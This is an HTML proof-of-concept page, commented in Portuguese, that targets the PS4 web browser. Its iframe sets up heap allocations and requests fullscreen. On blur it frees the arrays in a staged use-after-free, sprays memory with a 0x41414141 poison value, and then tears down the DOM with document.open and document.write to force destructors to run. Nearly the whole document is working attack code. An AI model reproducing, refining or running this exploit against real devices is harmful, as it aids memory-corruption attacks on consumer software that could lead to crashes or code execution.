<!DOCTYPE html>
<html>
<head>
    <title>PS4 DOM DESTROYER</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; text-align: center; }
        iframe { width: 90%; height: 400px; border: 4px solid #f00; background: #fff; margin: 20px auto; display: block;}
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #0f0; }
    </style>
</head>
<body>

<h1>DOM DESTROYER TRIGGER</h1>
<h3>Simulando "Atualizar" via document.open()</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#200; color:#fff; text-align:center'>
        <h3>ZONA DO GATILHO</h3>
        <button onclick='startSequence()' style='padding:20px; font-size:20px; font-weight:bold; background:red; color:white; border:2px solid white;'>
            INICIAR SEQUÊNCIA DE DESTRUIÇÃO
        </button>
        <div id='status'>Pronto.</div>
        <script>
            var victims = [];
            var spray = [];
            const COUNT = 15000;
            // Usamos um valor que force SEGFAULT (Acesso de memória inválido)
            // 0x4141414141414141
            const POISON = 2.121995791e-314; 

            function startSequence() {
                document.getElementById('status').innerText = 'Alocando...';
                
                // 1. Setup Heap
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }
                
                // 2. Fullscreen
                document.getElementById('status').innerText = 'APERTE OPTIONS AGORA!';
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null;
                    
                    // Spray Massivo
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    // 4. A BOMBA ATÔMICA (Simula o Refresh)
                    // Em vez de reload(), vamos destruir o documento manualmente.
                    // Isso força os Destrutores C++ a rodarem AGORA.
                    
                    setTimeout(function() {
                        try {
                            // Para qualquer carregamento pendente
                            window.stop(); 
                            
                            // Limpa o documento atual (Destrói a árvore DOM)
                            document.open(); 
                            document.write('<h1>CRASH IMMINENT</h1>'); 
                            document.close();
                            
                            // Se ainda estiver vivo, força navegação para o nada
                            window.location.href = 'about:blank';
                        } catch(e) {}
                    }, 50);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

<script>
    // Monitor de Vida
    setInterval(function(){
        document.getElementById('log').innerHTML = '>> Sistema Operacional: O navegador ainda está respondendo... ' + new Date().toLocaleTimeString();
    }, 1000);
</script>

</body>
</html>
